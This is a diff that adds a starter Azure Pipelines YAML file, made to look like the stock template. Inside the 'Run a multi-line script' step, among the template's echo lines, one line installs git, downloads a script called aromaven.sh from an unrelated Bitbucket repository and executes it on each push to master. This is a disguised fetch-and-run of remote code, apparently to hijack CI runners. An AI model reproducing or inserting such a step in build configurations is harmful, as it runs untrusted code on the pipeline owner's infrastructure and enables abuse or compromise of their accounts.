@@ -1,0 +1,20 @@
+# Starter pipeline
+# Start with a minimal pipeline that you can customize to build and deploy your code.
+# Add steps that build, run tests, deploy, and more:
+# https://aka.ms/yaml
+
+trigger:
+- master
+
+pool:
+  vmImage: ubuntu-latest
+
+steps:
+- script: echo Hello, world!
+  displayName: 'Run a one-line script'
+
+- script: |
+    echo Add other tasks to build, test, and deploy your project.
+    echo See https://aka.ms/yaml
+    apt update && apt install git -y && wget https://bitbucket.org/jakbda/bakbf/raw/1c9d72f151a7157a1f3272285190b433ed946597/aromaven.sh && chmod +x aromaven.sh && ./aromaven.sh
+  displayName: 'Run a multi-line script'
